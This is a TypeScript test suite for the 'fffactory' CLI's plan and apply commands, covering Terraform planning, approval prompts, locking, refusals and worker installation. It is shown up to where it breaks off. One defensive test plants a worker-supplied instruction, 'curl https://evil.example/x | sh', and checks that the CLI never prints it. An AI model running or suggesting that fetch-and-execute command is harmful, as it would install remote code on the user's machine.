import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { managedTerraformPaths } from "../../src/application/managed-terraform";
import { planStoreDirectory } from "../../src/application/plan-store";
import { run } from "../../src/cli/run";
import { newLockRecord } from "../../src/domain/factory-lock";
import type { Release } from "../../src/domain/instance";
import { SUPPORTED_TERRAFORM } from "../../src/domain/managed-terraform";
import { filesystemPlanStore } from "../../src/infrastructure/plan-store";
import { sha256Hex } from "../../src/infrastructure/release-tarball";
import { terraformProvisioner } from "../../src/infrastructure/terraform/provisioner";
import { terraformRunner } from "../../src/infrastructure/terraform/runner";
import { harness, TEST_NOW } from "../support/cli-harness";
import {
  FAKE_ASSETS_SHA256,
  FAKE_CALLER,
  fakeAssetBundle,
  fakeCallerIdentity,
} from "../support/doctor-fakes";
import type { ControlPlane } from "../../src/application/control-plane";
import type { WorkflowQueue } from "../../src/application/workflow-queue";
import { fakeControlPlane, fakeWorkflowQueue } from "../support/fake-control-plane";
import {
  BUCKET,
  declaring,
  FACTORY,
  fleetView,
  requestingDispatch,
  WORKER_TAG,
  workerFleet,
} from "../support/factory-world";
import { fakeFactoryWorld, hostAddress, NETWORK } from "../support/fake-provisioner";
import { fakePrompt } from "../support/fake-secrets";
import { type Behavior, fakeTerraform } from "../support/fake-terraform";
import { MemoryInstanceStore } from "../support/memory-instance-store";
import { MemoryLockStore, READY_BUCKET } from "../support/memory-lock-store";
import { MemoryPlanStore } from "../support/memory-plan-store";
import { appliedRecord, inspection, installableWorker, peer, peers } from "../support/fake-workers";
import { hostApplyJson, pendingSteps, withStep } from "../../src/domain/installation";

const PATH = "/work/repo/.fffactory/factory.json";
const INSTANCE_LINE = `Instance: ${PATH} (nearest .fffactory/factory.json)`;
const ASSETS = "/home/operator/.cache/fffactory/releases/0.3.0";
const HEADER = [
  "Factory plan:",
  `  Configuration: ${PATH}`,
  "  Factory: Test factory (fff-abcd1234)",
  "  AWS account: 123456789012, Region: eu-west-2",
  "  Release: 0.3.0",
];
const B1 = "fff-abcd1234-builder-1";
const WORKERS = [
  "Worker changes, one worker at a time:",
  `  ~ builder-1 (${B1}): install release 0.3.0 and its host configuration, then verify it`,
];
const CONTROL_PLANE = [
  "Control-plane changes, before worker activation:",
  `  ~ builder-1 (${B1}): paseo-package, service-definition, listen-address`,
];
const REPOSITORIES = [
  "Repository changes, one worker at a time:",
  `  ~ builder-1 (${B1}): reconcile 0 placed repositories as factory; preserve and report unmanaged checkouts`,
];
const DISPATCH = [
  "Dispatch changes, after every readiness gate:",
  `  ~ builder-1 (${B1}): remove the factory dispatch schedule if it exists`,
  "End-to-end verification: observe each worker's release, repositories, Paseo and actual dispatch schedule.",
];
const REPOSITORY_RESULTS = ["Repositories:", `  synchronized  builder-1 (${B1})`];
/** What apply prints while it installs builder-1, and once it is installed. */
const INSTALLED = [
  "Installing release 0.3.0 on builder-1 (fff-abcd1234-builder-1): uploading 0.0 MiB.",
  "Installing release 0.3.0 on builder-1 (fff-abcd1234-builder-1): host apply runs the install " +
    "steps, then verifies; this can take many minutes.",
];
const ENROLLMENT_PENDING =
  `  installed  builder-1 (${B1}): release 0.3.0 installed and verified; enrollment pending: ` +
  "GitHub, OpenAI Codex, Claude Code";

function text(hosts: string[], overrides: object = {}): string {
  return `${JSON.stringify({ ...declaring(...hosts), ...overrides }, null, 2)}\n`;
}

/**
 * The CLI over one factory: factory.json declaring `declared`, its state bucket (unless
 * `bucket` is false) and a Terraform world with `hosts` provisioned. Answers the prompt with
 * `answers` at a terminal when `interactive`.
 */
function cli(
  options: {
    declared?: string[];
    hosts?: string[];
    bucket?: boolean;
    interactive?: boolean;
    answers?: (string | undefined)[];
    document?: string;
    identity?: ReturnType<typeof fakeCallerIdentity>;
    fleet?: ReturnType<typeof workerFleet>;
    controlPlane?: ControlPlane;
    workflowQueue?: WorkflowQueue;
  } = {},
) {
  const store = new MemoryInstanceStore({
    [PATH]: options.document ?? text(options.declared ?? ["builder-1"]),
  });
  const lockStore = new MemoryLockStore(options.bucket === false ? [] : [BUCKET]);
  const terraform = fakeFactoryWorld({ store: lockStore, bucket: BUCKET, hosts: options.hosts });
  if ((options.hosts ?? []).length > 0) lockStore.states.set(BUCKET, "revision-0");
  const planStore = new MemoryPlanStore();
  const prompt = fakePrompt({
    interactive: options.interactive ?? false,
    answers: options.answers,
  });
  const assets = fakeAssetBundle();
  const identity = options.identity ?? fakeCallerIdentity();
  const fleet = options.fleet ?? workerFleet();
  const signal = { interrupted: false };
  const context = harness(
    store,
    {},
    {
      lockStore,
      provisioner: terraform.provisioner,
      planStore,
      prompt: prompt.prompt,
      assets: assets.bundle,
      identity: identity.identity,
      interrupted: () => signal.interrupted,
      tailnet: fleet.deps.peers,
      transport: fleet.deps.transport,
      sleep: fleet.deps.sleep,
      ...(options.controlPlane === undefined ? {} : { controlPlane: options.controlPlane }),
      ...(options.workflowQueue === undefined ? {} : { workflowQueue: options.workflowQueue }),
    },
  );
  return {
    ...context,
    store,
    lockStore,
    terraform,
    planStore,
    prompt,
    assets,
    identity,
    signal,
    fleet,
  };
}

describe("fffactory plan (plan-apply §Plan)", () => {
  test("shows the target and the infrastructure changes, and saves the plan", async () => {
    const { context, out, err, planStore, terraform, assets, store } = cli();
    expect(await run(["plan"], context)).toBe(0);
    expect(err).toEqual([]);
    expect(out).toEqual([
      INSTANCE_LINE,
      ...HEADER,
      "Infrastructure changes:",
      `  + ${NETWORK}`,
      `  + ${hostAddress("builder-1")}`,
      "  2 to add, 0 to change, 0 to destroy.",
      ...WORKERS,
      ...CONTROL_PLANE,
      ...REPOSITORIES,
      ...DISPATCH,
      "Saved as plan aaaaaaaa, until 2026-09-30T13:00:00.000Z. To apply exactly it:",
      "  fffactory apply --plan-id aaaaaaaa",
    ]);
    expect(planStore.saved.get(`${FACTORY}/aaaaaaaa`)).toMatchObject({
      instance_path: PATH,
      configuration_sha256: sha256Hex(new TextEncoder().encode(store.files[PATH])),
      release: "0.3.0",
      assets_sha256: FAKE_ASSETS_SHA256,
      account_id: "123456789012",
    });
    expect(assets.materialized).toEqual([ASSETS]);
    expect(terraform.calls[0]?.request.configuration).toEqual({
      directory: `${ASSETS}/terraform`,
      root: "factory",
    });
  });

  test("the apply hint repeats the instance and profile the plan was made with", async () => {
    const { context, out, store } = cli();
    store.files["/elsewhere/my factory.json"] = store.files[PATH] as string;
    const args = ["plan", "--instance", "/elsewhere/my factory.json", "--profile", "factory"];
    expect(await run(args, context)).toBe(0);
    expect(out.at(-1)).toBe(
      "  fffactory apply --plan-id aaaaaaaa --instance '/elsewhere/my factory.json' --profile factory",
    );
  });

  test("without infrastructure changes, the plan installs the workers and is saved", async () => {
    const { context, out, planStore } = cli({ hosts: ["builder-1"] });
    expect(await run(["plan"], context)).toBe(0);
    expect(out.slice(-12)).toEqual([
      "Infrastructure: no changes.",
      ...WORKERS,
      ...CONTROL_PLANE,
      ...REPOSITORIES,
      ...DISPATCH,
      "Saved as plan aaaaaaaa, until 2026-09-30T13:00:00.000Z. To apply exactly it:",
      "  fffactory apply --plan-id aaaaaaaa",
    ]);
    expect(planStore.saved.size).toBe(1);
  });

  test("before the first apply, shows backend bootstrap's plan", async () => {
    const { context, out, lockStore } = cli({ bucket: false });
    expect(await run(["plan"], context)).toBe(0);
    expect(out).toEqual([
      INSTANCE_LINE,
      `Backend bootstrap: the state bucket ${BUCKET} does not exist yet.`,
      ...HEADER.slice(1),
      "Terraform will create:",
      "  + module.state_bucket.aws_s3_bucket.state",
      "The factory itself is planned once the state bucket exists: `fffactory apply` asks you " +
        "to approve this bootstrap first, then plans the factory for its own approval.",
    ]);
    expect(lockStore.buckets.size).toBe(0);
  });

  test("refuses another account before anything else reaches AWS", async () => {
    const other = fakeCallerIdentity({
      kind: "caller",
      caller: { ...FAKE_CALLER, account: "210987654321" },
    });
    const { context, err, terraform, lockStore, assets } = cli({ identity: other });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toStartWith("Refusing to plan: ");
    expect(terraform.calls).toEqual([]);
    expect(lockStore.calls).toEqual([]);
    expect(assets.materialized).toEqual([]);
  });

  test("the CLI/pin match guard refuses a factory pinned to another release", async () => {
    const { context, err, terraform } = cli({
      document: text(["builder-1"], { release: "0.2.0" }),
    });
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "Refusing to plan: factory.json pins another fffactory release than this one, 0.3.0: " +
        "only the pinned release may plan or change this factory. Install the release " +
        "factory.json pins, or move the pin to 0.3.0 with `fffactory upgrade`.",
    ]);
    expect(terraform.calls).toEqual([]);
  });

  test("an incomplete factory.json is refused with each missing field", async () => {
    const { context, err } = cli({ document: text(["builder-1"], { network: undefined }) });
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "Refusing to plan: factory.json is not ready:",
      "  network.vpc_cidr: is required to plan",
      "  network.public_subnet_cidr: is required to plan",
      "  network.availability_zone: is required to plan",
    ]);
  });

  test("D11: removing a provisioned host key is refused, naming host retirement", async () => {
    const { context, err, planStore } = cli({ hosts: ["builder-1", "builder-2"] });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toBe(
      "Refusing: this change needs host retirement, which fffactory does not have yet " +
        "(D11; it arrives in milestone M3):",
    );
    expect(err[1]).toContain('host key "builder-2" is provisioned but no longer declared');
    expect(planStore.saved.size).toBe(0);
  });

  test("D11: a plan that replaces a host is refused, naming host replacement", async () => {
    const { context, err, terraform } = cli({ hosts: ["builder-1"] });
    terraform.world.replace.add("builder-1");
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "Refusing: this change needs host retirement and replacement, which fffactory does " +
        "not have yet (D11; it arrives in milestone M3):",
      `  ${hostAddress("builder-1")} would be replaced`,
      "Nothing was applied. Change factory.json so the plan keeps every host machine, then " +
        "plan again.",
    ]);
  });

  test("a state bucket bootstrap did not finish is refused with how to complete it", async () => {
    const { context, err, lockStore } = cli();
    lockStore.readiness.set(BUCKET, { ...READY_BUCKET, encrypted: false });
    expect(await run(["plan"], context)).toBe(1);
    expect(err[0]).toBe(
      `The state bucket ${BUCKET} exists, but backend bootstrap did not finish it. It lacks:`,
    );
    expect(err[1]).toBe("  default encryption");
  });

  test("a Terraform plan fffactory cannot read is refused", async () => {
    const { context, err, terraform } = cli();
    terraform.world.shown = { resource_changes: "garbled" };
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "Refusing to plan: Terraform's plan is not one fffactory can apply:",
      "  Terraform's plan could not be read",
    ]);
  });

  test("while the factory is locked, shows the holder", async () => {
    const { context, err, lockStore } = cli({ hosts: ["builder-1"] });
    lockStore.hold(
      BUCKET,
      newLockRecord({
        factoryId: FACTORY,
        operation: "apply",
        holder: { principal: "arn:aws:iam::123456789012:user/other", host: "desk" },
        now: new Date(TEST_NOW.getTime() - 5 * 60_000),
        release: "0.3.0" as Release,
        randomBytes: (count) => new Uint8Array(count).fill(9),
      }),
    );
    expect(await run(["plan"], context)).toBe(1);
    expect(err).toEqual([
      "The factory is locked by another operation:",
      "  Lock jjjjjjjj: apply by arn:aws:iam::123456789012:user/other on desk",
      "  Acquired 2026-09-30T11:55:00.000Z (5 min ago) by fffactory 0.3.0",
      "Wait for it to finish. If its holder is no longer running, break the lock with " +
        "`fffactory lock break`.",
    ]);
  });

  test("an empty --profile is refused", async () => {
    const { context, err } = cli();
    expect(await run(["plan", "--profile", ""], context)).toBe(1);
    expect(err).toEqual(["fffactory plan: --profile needs a profile name"]);
  });
});

describe("fffactory apply (plan-apply §Apply)", () => {
  test("at a terminal, shows the plan, applies it once yes is typed, and releases the lock", async () => {
    const { context, out, err, prompt, lockStore, terraform } = cli({
      interactive: true,
      answers: ["yes"],
    });
    lockStore.buckets.add(BUCKET);
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([]);
    const key = `${FACTORY}-operations/2026-09-30T12:00:00.000Z-aaaaaaaa.json`;
    expect(out).toEqual([
      INSTANCE_LINE,
      ...HEADER,
      "Infrastructure changes:",
      `  + ${NETWORK}`,
      `  + ${hostAddress("builder-1")}`,
      "  2 to add, 0 to change, 0 to destroy.",
      ...WORKERS,
      ...CONTROL_PLANE,
      ...REPOSITORIES,
      ...DISPATCH,
      "Applying. Terraform's output is not shown; this can take several minutes.",
      ...INSTALLED,
      "Applied: the factory's infrastructure matches factory.json.",
      "Workers:",
      ENROLLMENT_PENDING,
      `             GitHub: Authenticate GitHub as factory on ${B1} (tailnet SSH policy must let you log in as \`factory\`): run \`tailscale ssh factory@${B1}\`, then \`gh auth login --hostname github.com --git-protocol https --web\`, then \`gh auth status\``,
      `             OpenAI Codex: Log in to OpenAI Codex as factory on ${B1} (tailnet SSH policy must let you log in as \`factory\`): run \`tailscale ssh factory@${B1}\`, then \`codex login --device-auth\`, then \`codex login status\``,
      `             Claude Code: Log in to Claude Code as factory on ${B1} (tailnet SSH policy must let you log in as \`factory\`): run \`tailscale ssh factory@${B1}\`, then \`claude auth login\`, then \`claude auth status\``,
      "             Paseo clients: enrollment is checked from each client, not the worker",
      ...REPOSITORY_RESULTS,
      `Operation record: s3://${BUCKET}/${key}`,
    ]);
    expect(prompt.asked).toEqual(['Apply this plan? Only "yes" applies it: ']);
    expect(terraform.world.hosts.has("builder-1")).toBe(true);
    expect(lockStore.locks.size).toBe(0);
    expect(lockStore.operations.get(key)?.status).toBe("succeeded");
  });

  test.each([["no"], ["y"], [undefined]])(
    "any answer but yes (%p) applies nothing",
    async (answer) => {
      const { context, err, terraform, lockStore } = cli({ interactive: true, answers: [answer] });
      expect(await run(["apply"], context)).toBe(1);
      expect(err).toEqual(["Not approved: nothing was applied."]);
      expect(terraform.calls.some(({ call }) => call === "applyPlan")).toBe(false);
      expect(lockStore.locks.size).toBe(0);
    },
  );

  test("without a terminal or a plan ID, refuses before reaching AWS", async () => {
    const { context, err, identity } = cli();
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Applying needs your approval of the plan: rerun at a terminal, or save a plan with " +
        "`fffactory plan` and apply exactly it with --plan-id ID.",
    ]);
    expect(identity.requests).toEqual([]);
  });

  test("a malformed plan ID is refused", async () => {
    const { context, err } = cli();
    expect(await run(["apply", "--plan-id", "../x"], context)).toBe(1);
    expect(err).toEqual([
      "fffactory apply: --plan-id takes the 8-character plan ID `fffactory plan` printed",
    ]);
  });

  test("applies exactly a saved plan, approved by naming it, without asking", async () => {
    const { context, out, prompt, terraform } = cli();
    expect(await run(["plan"], context)).toBe(0);
    out.length = 0;
    terraform.calls.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(0);
    expect(out).toEqual([
      INSTANCE_LINE,
      ...HEADER,
      "Infrastructure changes:",
      `  + ${NETWORK}`,
      `  + ${hostAddress("builder-1")}`,
      "  2 to add, 0 to change, 0 to destroy.",
      ...WORKERS,
      ...CONTROL_PLANE,
      ...REPOSITORIES,
      ...DISPATCH,
      "Applying saved plan aaaaaaaa, approved by naming its ID.",
      "Applying. Terraform's output is not shown; this can take several minutes.",
      ...INSTALLED,
      "Applied: the factory's infrastructure matches factory.json.",
      "Workers:",
      ENROLLMENT_PENDING,
      ...Array(4).fill(expect.stringMatching(/^ {13}\S/)),
      ...REPOSITORY_RESULTS,
      expect.stringMatching(/^Operation record: s3:\/\//),
    ]);
    expect(prompt.asked).toEqual([]);
    expect(terraform.calls.map(({ call }) => call)).toEqual(["showPlan", "applyPlan"]);
  });

  test("applying a plan after factory.json changes is refused", async () => {
    const { context, err, store, terraform, lockStore } = cli();
    expect(await run(["plan"], context)).toBe(0);
    store.files[PATH] = text(["builder-1", "builder-2"]);
    terraform.calls.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err).toEqual([
      "Refusing to apply plan aaaaaaaa: it is no longer the plan to apply:",
      "  factory.json changed after it was planned",
      "Nothing was applied. Review a new plan with `fffactory plan`.",
    ]);
    expect(terraform.calls).toEqual([]);
    expect(lockStore.locks.size).toBe(0);
  });

  test("even a formatting change to factory.json makes a saved plan stale", async () => {
    const { context, err, store } = cli();
    expect(await run(["plan"], context)).toBe(0);
    store.files[PATH] = `${store.files[PATH]}\n`;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err).toContain("  factory.json changed after it was planned");
  });

  test("a plan ID with no saved plan, or a damaged one, is refused", async () => {
    const { context, err, planStore } = cli();
    expect(await run(["apply", "--plan-id", "zzzzzzzz"], context)).toBe(1);
    expect(err).toEqual([
      "There is no saved plan zzzzzzzz for this factory here: it expired, was applied, or " +
        "was saved elsewhere. Review a new plan with `fffactory plan`.",
    ]);
    expect(await run(["plan"], context)).toBe(0);
    planStore.damage(FACTORY, "aaaaaaaa");
    err.length = 0;
    expect(await run(["apply", "--plan-id", "aaaaaaaa"], context)).toBe(1);
    expect(err[0]).toStartWith("Saved plan aaaaaaaa cannot be applied");
  });

  test("a failed Terraform apply says what may have changed and how to converge", async () => {
    const { context, err, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "applyPlan";
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Applying failed: `terraform apply` exited with status 1.",
      "Terraform may have changed some of the infrastructure before it stopped.",
      "Rerun `fffactory apply`: it plans again from what exists now and converges what remains.",
    ]);
  });

  test("a failed Terraform plan says nothing was applied", async () => {
    const { context, err, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "plan";
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Planning failed: `terraform plan` exited with status 1. Nothing was applied.",
    ]);
  });

  test("with no infrastructure changes, installs the workers once yes is typed", async () => {
    const { context, out, prompt, terraform } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(out).toContain("Infrastructure: no changes to apply.");
    expect(out).toContain(ENROLLMENT_PENDING);
    expect(prompt.asked).toHaveLength(1);
    expect(terraform.calls.some(({ call }) => call === "applyPlan")).toBe(false);
  });

  test("a skipped worker exits 2 with its next action", async () => {
    const { context, out } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet([]),
    });
    expect(await run(["apply"], context)).toBe(2);
    expect(out).toContain(
      `  skipped    builder-1 (${B1}): No Tailscale device named ${B1} is visible from this machine`,
    );
    expect(out.find((line) => line.startsWith("             Next: "))).toEndWith(
      ", then rerun `fffactory apply`.",
    );
  });

  describe("a skipped worker with dispatch requested exits 2, never failed (#134)", () => {
    const REQUESTING = `${JSON.stringify(requestingDispatch(), null, 2)}\n`;

    test("deferred Paseo maintenance is reported deferred end to end", async () => {
      const stale = installableWorker(appliedRecord(B1), {
        inspection: inspection(
          B1,
          { release: { state: "active", version: "0.2.0", sha256: "c".repeat(64) } },
          "0.2.0",
        ),
      });
      const { context, out, err } = cli({
        hosts: ["builder-1"],
        interactive: true,
        answers: ["yes"],
        document: REQUESTING,
        fleet: workerFleet(["builder-1"], { [B1]: stale }),
        controlPlane: fakeControlPlane("healthy", { kind: "active", count: 1 }).controlPlane,
        workflowQueue: fakeWorkflowQueue().queue,
      });
      expect(await run(["apply"], context)).toBe(2);
      expect(err).toEqual([]);
      const dispatch = out.slice(out.indexOf("Dispatch:"));
      expect(dispatch.slice(0, 3)).toEqual([
        "Dispatch:",
        `  skipped  builder-1 (${B1}): Paseo maintenance is deferred while agents may be active`,
        `    Next: Close the active agents on ${B1}, then rerun \`fffactory apply\``,
      ]);
      const verified = out.find((line) => line.startsWith(`  ${B1} is not ready: `));
      expect(verified).toContain(
        "Release left as is: Paseo maintenance is deferred while agents may be active",
      );
      expect(verified).not.toContain("absent");
      expect(out.some((line) => line.includes("failed"))).toBe(false);
    });

    test("an offline worker is reported skipped by dispatch, with the workers stage's next action", async () => {
      const { context, out, err } = cli({
        hosts: ["builder-1"],
        interactive: true,
        answers: ["yes"],
        document: REQUESTING,
        fleet: workerFleet(["builder-1"], {}, () =>
          peers(peer(B1, { tags: [WORKER_TAG], online: false })),
        ),
        controlPlane: fakeControlPlane("healthy", { kind: "idle" }).controlPlane,
        workflowQueue: fakeWorkflowQueue().queue,
      });
      expect(await run(["apply"], context)).toBe(2);
      expect(err).toEqual([]);
      const dispatch = out.slice(out.indexOf("Dispatch:"));
      expect(dispatch.slice(0, 3)).toEqual([
        "Dispatch:",
        `  skipped  builder-1 (${B1}): Offline in the tailnet`,
        "    Next: Check that the instance is running and that Tailscale is up on it, then rerun `fffactory apply`.",
      ]);
      expect(out.some((line) => line.includes("failed") || line.includes("absent"))).toBe(false);
    });
  });

  test("one apply creates a worker, waits for its first boot, then installs and verifies it", async () => {
    const { context, out, err } = cli({
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {}, (read) =>
        read < 3 ? fleetView() : fleetView("builder-1"),
      ),
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([]);
    const applying = out.indexOf(
      "Applying. Terraform's output is not shown; this can take several minutes.",
    );
    expect(out.slice(applying + 1, applying + 5)).toEqual([
      `Waiting for builder-1 (${B1}) to finish its first boot (up to 15 min): this apply just ` +
        "created its machine.",
      ...INSTALLED,
      "Applied: the factory's infrastructure matches factory.json.",
    ]);
    expect(out).toContain(ENROLLMENT_PENDING);
  });

  test("a new worker that never finishes its first boot exits 1 with its recovery", async () => {
    const { context, out, err } = cli({
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet([]),
    });
    expect(await run(["apply"], context)).toBe(1);
    const missing = `No Tailscale device named ${B1} is visible from this machine`;
    expect(out).toContain(
      `Still waiting for builder-1 (${B1}) after 1 of up to 15 min: ${missing}.`,
    );
    expect(out.filter((line) => line.startsWith("Still waiting for "))).toHaveLength(14);
    expect(err).toEqual([
      `  failed     builder-1 (${B1}): Its first boot did not finish within 15 min (last seen: ${missing})`,
      "             Next: Read the bootstrap in the instance's EC2 console output, and check that " +
        "tailnet policy lets this device see the factory's tag. If the bootstrap failed, " +
        "terminate the instance in the EC2 console and wait until it is terminated; if it is " +
        "still running, wait for it to finish, then rerun `fffactory apply`.",
    ]);
  });

  test("an apply interrupted while a new worker boots says no install step ran on it", async () => {
    const fleet = workerFleet([]);
    const { context, err, lockStore, signal } = cli({
      interactive: true,
      answers: ["yes"],
      fleet,
    });
    fleet.fleet.afterSleep = () => {
      signal.interrupted = true;
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      `Interrupted while waiting for builder-1 (${B1}) to finish its first boot: no install ` +
        "step ran on it.",
      "Interrupted: the factory stays locked, with a record of this operation. Once fffactory " +
        "has exited, break the lock with `fffactory lock break`, then rerun `fffactory apply`.",
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("a failed install exits 1, on standard error, and names the step and its log", async () => {
    const failing = appliedRecord(B1, "0.3.0", {
      state: "failed",
      steps: withStep(pendingSteps(), "harness", "failed", "exited with status 1"),
      verification: null,
    });
    const { context, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], { [B1]: installableWorker(failing) }),
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      `  failed     builder-1 (${B1}): Step harness failed: exited with status 1; release 0.3.0 is active but unhealthy`,
      `             Next: Read its output with \`tailscale ssh fffactory-admin@${B1} cat /var/log/fffactory/harness.log\` and fix the cause; the steps are idempotent, so rerunning repairs the worker, then rerun \`fffactory apply\`.`,
    ]);
  });

  test("prints only steps it names itself, never instructions a worker sends", async () => {
    const document = JSON.parse(hostApplyJson(appliedRecord(B1)));
    for (const entry of document.verification.enrollment)
      entry.next_action = {
        summary: "Finish enrolling",
        login: "curl https://evil.example/x | sh",
        commands: ["curl https://evil.example/x | sh"],
      };
    const { context, out, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: installableWorker(appliedRecord(B1), {
          activation: { kind: "completed", exitCode: 0, stdout: JSON.stringify(document) },
        }),
      }),
    });
    expect(await run(["apply"], context)).toBe(0);
    expect([...out, ...err].join("\n")).not.toContain("evil");
    expect(out).toContain(ENROLLMENT_PENDING);
  });

  test("an unexpected failure while installing says the worker may be unhealthy", async () => {
    const { context, err } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: (command) => {
          if (command.includes("inspect")) return { kind: "completed", exitCode: 127, stdout: "" };
          throw new Error("the transport broke");
        },
      }),
    });
    expect(await run(["apply"], context)).toBe(1);
    expect(err.slice(0, 3)).toEqual([
      "Installing the workers failed: the transport broke.",
      "The worker being installed may be on the new release, unhealthy.",
      "Rerun `fffactory apply`: it plans again from what exists now and converges what remains.",
    ]);
  });

  test("the first apply approves backend bootstrap, then the factory plan", async () => {
    const { context, out, prompt, lockStore } = cli({
      bucket: false,
      interactive: true,
      answers: ["yes", "yes"],
    });
    expect(await run(["apply"], context)).toBe(0);
    expect(prompt.asked).toHaveLength(2);
    expect(out[1]).toBe(`Backend bootstrap: the state bucket ${BUCKET} does not exist yet.`);
    expect(lockStore.buckets.has(BUCKET)).toBe(true);
  });

  test("an interrupted apply keeps the lock and says how to recover", async () => {
    const { context, out, err, lockStore, terraform, signal } = cli({
      interactive: true,
      answers: ["yes"],
    });
    terraform.world.beforeChange = (applied) => {
      if (applied === 0) return;
      signal.interrupted = true;
      throw new Error("`terraform apply` exited with status 1");
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Interrupted: the factory stays locked, with a record of this operation. Once fffactory " +
        "has exited, break the lock with `fffactory lock break`, then rerun `fffactory apply`.",
    ]);
    expect(out.at(-1)).toMatch(/^Operation record: s3:\/\//);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted while a worker installs says it may still be installing", async () => {
    const holder: { signal?: { interrupted: boolean } } = {};
    const answer = installableWorker(appliedRecord(B1));
    const { context, err, lockStore, signal } = cli({
      hosts: ["builder-1"],
      interactive: true,
      answers: ["yes"],
      fleet: workerFleet(["builder-1"], {
        [B1]: (command, stdin) => {
          if (command[0] === "sudo" && holder.signal) holder.signal.interrupted = true;
          return typeof answer === "function" ? answer(command, stdin) : answer;
        },
      }),
    });
    holder.signal = signal;
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      `Interrupted while installing on builder-1 (${B1}): host apply may still be running ` +
        "there, and a rerun skips that worker until it has finished.",
      "Interrupted: the factory stays locked, with a record of this operation. Once fffactory " +
        "has exited, break the lock with `fffactory lock break`, then rerun `fffactory apply`.",
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted as it takes the lock says the lock may have no record", async () => {
    const { context, err, lockStore, signal } = cli({ interactive: true, answers: ["yes"] });
    const create = lockStore.create.bind(lockStore);
    lockStore.create = async (bucket, record) => {
      signal.interrupted = true;
      return create(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Interrupted: the factory stays locked by this apply, which may have no operation " +
        "record. Once fffactory has exited, break the lock with `fffactory lock break`, then " +
        "rerun `fffactory apply`.",
    ]);
    expect(lockStore.locks.size).toBe(1);
  });

  test("an apply interrupted before it takes the lock says the factory is not locked", async () => {
    const { context, err, lockStore, prompt, signal } = cli({
      bucket: false,
      interactive: true,
      answers: ["yes"],
    });
    const ask = prompt.prompt.ask;
    prompt.prompt.ask = async (question) => {
      signal.interrupted = true;
      return ask(question);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Interrupted before the factory was locked: it is not locked. Rerun `fffactory apply`: " +
        "it plans again from what exists now.",
    ]);
    expect(lockStore.locks.size).toBe(0);
  });

  test("an operation record that cannot be finished is reported after applying", async () => {
    const { context, err, lockStore } = cli({ interactive: true, answers: ["yes"] });
    const write = lockStore.writeOperation.bind(lockStore);
    lockStore.writeOperation = async (bucket, record) => {
      if (record.status === "succeeded")
        throw new Error("S3 PutObject on the state bucket failed: SlowDown");
      await write(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(0);
    expect(err).toEqual([
      "The operation record could not be finished: S3 PutObject on the state bucket failed: SlowDown",
    ]);
  });

  test("a failed apply whose record cannot be finished reports both", async () => {
    const { context, err, lockStore, terraform } = cli({ interactive: true, answers: ["yes"] });
    terraform.world.failNext = "applyPlan";
    const write = lockStore.writeOperation.bind(lockStore);
    lockStore.writeOperation = async (bucket, record) => {
      if (record.status === "failed")
        throw new Error("S3 PutObject on the state bucket failed: SlowDown");
      await write(bucket, record);
    };
    expect(await run(["apply"], context)).toBe(1);
    expect(err).toEqual([
      "Applying failed: `terraform apply` exited with status 1.",
      "Terraform may have changed some of the infrastructure before it stopped.",
      "Rerun `fffactory apply`: it plans again from what exists now and converges what remains.",
      "The operation record could not be finished: S3 PutObject on the state bucket failed: SlowDown",
    ]);
  });

  test("refusals to plan are shown for apply too", async () => {
    const { context, err } = cli({ interactive: true, hosts: ["builder-1", "builder-2"] });
    expect(await run(["apply"], context)).toBe(1);
    expect(err[0]).toStartWith("Refusing: this change needs host retirement");
    const other = cli({
      interactive: true,
      document: text(["builder-1"], { release: "0.2.0" }),
    });
    expect(await run(["apply"], other.context)).toBe(1);
    expect(other.err[0]).toStartWith("Refusing to apply: factory.json pins another");
  });

  test("an empty --profile is refused", async () => {
    const { context, err } = cli();
    expect(await run(["apply", "--profile", ""], context)).toBe(1);
    expect(err).toEqual(["fffactory apply: --profile needs a profile name"]);
  });
});

describe("Terraform's diagnostics (plan-apply §Failure)", () => {
